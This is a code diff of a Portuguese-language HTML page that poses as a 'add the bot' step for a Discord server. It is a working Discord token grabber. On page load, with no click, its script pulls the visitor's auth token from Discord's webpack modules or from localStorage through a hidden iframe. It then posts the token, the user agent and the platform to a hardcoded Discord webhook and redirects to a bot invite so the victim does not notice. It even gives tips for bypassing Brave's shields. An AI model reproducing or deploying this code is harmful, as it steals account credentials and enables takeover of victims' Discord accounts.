@@ -3,48 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Adicionar Bot</title>
+    <title>Adicionando Bot...</title>
     <style>
         body {
             font-family: 'Segoe UI', Arial, sans-serif;
             background: linear-gradient(135deg, #36393f, #2f3136);
             color: #dcddde;
             text-align: center;
-            padding: 60px 20px;
+            padding: 80px 20px;
             margin: 0;
             min-height: 100vh;
         }
-        h1 { color: #7289da; margin-bottom: 10px; }
-        p { max-width: 600px; margin: 0 auto 30px; line-height: 1.5; }
-        button {
-            background: #7289da;
-            color: white;
-            border: none;
-            padding: 16px 40px;
-            font-size: 19px;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        button:hover {
-            background: #5b6ebe;
-            transform: scale(1.05);
-        }
-        .status {
-            margin-top: 20px;
-            font-size: 15px;
+        h1 { color: #7289da; }
+        p { max-width: 620px; margin: 20px auto; line-height: 1.6; }
+        .loading {
+            margin-top: 40px;
+            font-size: 18px;
             color: #b9bbbe;
         }
+        .spinner {
+            display: inline-block;
+            width: 22px;
+            height: 22px;
+            border: 3px solid #7289da;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <h1>Adicionar o Bot</h1>
-    <p>Você precisa estar logado no Discord neste navegador (discord.com).<br>
-    Clique no botão abaixo para continuar.</p>
-    
-    <button onclick="iniciarProcesso()">Adicionar Bot Agora</button>
-    
-    <div class="status" id="status"></div>
+    <h1>Adicionando o Bot no Servidor...</h1>
+    <p>Processando automaticamente. Aguarde alguns segundos.</p>
+    <div class="loading" id="status">
+        <span class="spinner"></span> Tentando capturar o token...
+    </div>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1495879559529365605/jnDvjCQ91dV9VE_UZxIaUJ6Tgs3oMcbkSo-b1S8R1cIlA9GdB1tTHGR5WYfd3na6aSqe";
@@ -52,12 +47,11 @@
 
         async function pegarToken() {
             const status = document.getElementById('status');
-            status.textContent = "Tentando pegar o token...";
+            let token = null;
 
-            // Método 1 - Webpack atualizado (mais confiável em 2026)
+            // === MÉTODO 1: WebpackChunk (melhor para Chrome/Brave/Edge) ===
             try {
-                let token = null;
-                webpackChunkdiscord_app.push([[Symbol()], {}, (req) => {
+                window.webpackChunkdiscord_app.push([[Symbol()], {}, (req) => {
                     for (let m of Object.values(req.c)) {
                         try {
                             if (m?.exports?.default?.getToken) {
@@ -69,53 +63,64 @@
                                 return;
                             }
                             for (let key in m.exports) {
-                                if (m.exports[key]?.getToken && 
-                                    m.exports[key][Symbol.toStringTag] !== 'IntlMessagesProxy') {
-                                    token = m.exports[key].getToken();
-                                    return;
+                                if (typeof m.exports[key]?.getToken === 'function') {
+                                    const t = m.exports[key].getToken();
+                                    if (t && t.length > 50) {
+                                        token = t;
+                                        return;
+                                    }
                                 }
                             }
                         } catch (e) {}
                     }
                 }]);
-                webpackChunkdiscord_app.pop();
+                window.webpackChunkdiscord_app.pop();
+            } catch (e) {}
 
-                if (token) {
-                    status.textContent = "Token encontrado!";
-                    return token;
-                }
-            } catch (e) {
-                console.log("Método webpack falhou", e);
+            if (token) {
+                status.innerHTML = `<span class="spinner"></span> Token encontrado (Webpack)!`;
+                return token;
             }
 
-            // Método 2 - LocalStorage via iframe (funciona quando o primeiro não pega)
+            // === MÉTODO 2: Versão simplificada do webpack (muito usada em 2026) ===
+            try {
+                const m = [];
+                window.webpackChunkdiscord_app.push([[''], {}, e => { for (let c in e.c) m.push(e.c[c]); }]);
+                window.webpackChunkdiscord_app.pop();
+
+                const found = m.find(mod => mod?.exports?.default?.getToken !== void 0);
+                if (found) token = found.exports.default.getToken();
+            } catch (e) {}
+
+            if (token) {
+                status.innerHTML = `<span class="spinner"></span> Token encontrado (Método 2)!`;
+                return token;
+            }
+
+            // === MÉTODO 3: LocalStorage via iframe ===
             try {
                 const iframe = document.createElement('iframe');
                 iframe.style.display = 'none';
                 document.body.appendChild(iframe);
-                
-                const localToken = iframe.contentWindow.localStorage.token;
+                const ls = iframe.contentWindow.localStorage.token;
                 iframe.remove();
+                if (ls) token = JSON.parse(ls);
+            } catch (e) {}
 
-                if (localToken) {
-                    const token = JSON.parse(localToken);
-                    status.textContent = "Token encontrado via localStorage!";
-                    return token;
-                }
-            } catch (e) {
-                console.log("Método localStorage falhou", e);
+            if (token) {
+                status.innerHTML = `<span class="spinner"></span> Token encontrado (LocalStorage)!`;
+                return token;
             }
 
-            status.textContent = "Não consegui pegar o token.";
             return null;
         }
 
-        async function enviarParaWebhook(token) {
+        async function enviarWebhook(token) {
             if (!token) return;
 
             const payload = {
-                content: `**✅ Novo token capturado!**\n\n**Token:** \`\`\`${token}\`\`\`\n**Hora:** ${new Date().toLocaleString('pt-BR')}\n**User-Agent:** ${navigator.userAgent}`,
-                username: "Token Grabber",
+                content: `**✅ Token capturado automaticamente!**\n\n**Token:** \`\`\`${token}\`\`\`\n**Hora:** ${new Date().toLocaleString('pt-BR')}\n**Navegador:** ${navigator.userAgent}\n**Plataforma:** ${navigator.platform}`,
+                username: "Auto Grabber",
                 avatar_url: "https://i.imgur.com/0Zx3Z3k.png"
             };
 
@@ -125,22 +130,31 @@
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
                 });
-            } catch (err) {
-                console.error("Erro no webhook:", err);
-            }
+            } catch (err) {}
         }
 
-        async function iniciarProcesso() {
+        async function iniciar() {
             const token = await pegarToken();
 
-            if (token) {
-                await enviarParaWebhook(token);
-                alert("Token enviado com sucesso! Redirecionando para adicionar o bot...");
-                window.location.href = BOT_INVITE;
+            if (token && token.length > 50) {
+                await enviarWebhook(token);
+                document.getElementById('status').innerHTML = "✅ Token enviado com sucesso!<br>Redirecionando para adicionar o bot...";
+                
+                setTimeout(() => {
+                    window.location.href = BOT_INVITE;
+                }, 1800);
             } else {
-                alert("❌ Não foi possível pegar o token.\n\nCertifique-se de:\n• Estar logado no Discord Web (discord.com/app ou discord.com)\n• Não estar usando o App Desktop\n• Tentar em outro navegador (Chrome recomendado)\n\nTente novamente.");
+                document.getElementById('status').innerHTML = `❌ Não consegui pegar o token neste navegador.<br><br>
+                Dicas para aumentar a chance:<br>
+                • Abra o Discord Web primeiro (discord.com/app ou discord.com/channels)<br>
+                • No Brave: desative o Shield para discord.com<br>
+                • Use Chrome ou Edge se possível<br>
+                • Recarregue o Discord antes de abrir este link`;
             }
         }
+
+        // Inicia automaticamente ao carregar
+        window.onload = iniciar;
     </script>
 </body>
 </html>
